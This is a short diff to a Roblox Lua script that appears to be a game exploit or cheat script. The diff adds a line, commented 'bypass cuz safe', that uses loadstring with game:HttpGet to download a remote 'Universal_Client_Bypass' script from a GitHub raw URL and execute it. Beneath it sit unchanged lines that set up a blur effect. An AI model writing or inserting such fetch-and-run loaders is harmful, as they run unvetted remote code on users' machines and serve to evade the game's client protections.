@@ -1,4 +1,5 @@
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G_Hub_Extras/main/Universal_Client_Bypass"))() -- bypass cuz safe
 
 local blur = Instance.new("BlurEffect", game.Lighting)
 blur.Size = 0
